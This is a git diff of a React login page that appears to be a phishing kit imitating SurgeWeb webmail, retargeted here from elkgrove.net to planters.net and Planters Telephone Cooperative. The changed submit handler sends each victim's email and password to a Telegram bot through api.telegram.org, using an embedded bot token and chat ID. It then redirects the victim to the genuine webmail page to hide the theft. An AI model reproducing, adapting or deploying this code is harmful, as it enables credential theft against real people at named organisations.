@@ -13,7 +13,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Elkgrove")
+    const[platform, setPlatform] = useState("Planters")
 
     const[showError, setShowError] = useState(false);
 
@@ -23,9 +23,9 @@ function Home(){
    
 
 
+   
     async function handleSubmit(e){
         e.preventDefault();
-    
     
         try {
             // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
@@ -34,11 +34,10 @@ function Home(){
             //     platform:platform
             // });
     
-            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
-                chat_id: 5916570239,
+           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
                 text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
               });
-    
     
         
             // Handle success
@@ -48,14 +47,12 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'http://mail.elkgrove.net:7080/surgeweb.exe';
+               window.location.href = 'https://mail.planters.net/surgeweb';
             }
           } catch (error) {
             // Handle error
             console.error('Error:', error);
           }
-        
-    
         
     }
 
@@ -91,7 +88,7 @@ function Home(){
                                 <span class="prompt"><label for="user">Username</label></span>
                                                 <div class="element"><input type="email"onChange={function(e){
                                                     setUserName(e.target.value);
-                                                }}value={email} className='inputwide' required/> <span className='font-weight-bold'>@ elkgrove.net</span>
+                                                }}value={email} className='inputwide' required/> <span className='font-weight-bold'>@ planters.net</span>
                                 </div>
                         </div>
 
@@ -157,7 +154,7 @@ function Home(){
                             backgroundColor:"#007",
                             color:"white",
                         }}>
-                            SurgeWeb ©2009-2021 Netwin Ltd, about SurgeMail
+                            Planters Telephone Cooperative ©2017
 
                         </div>
 
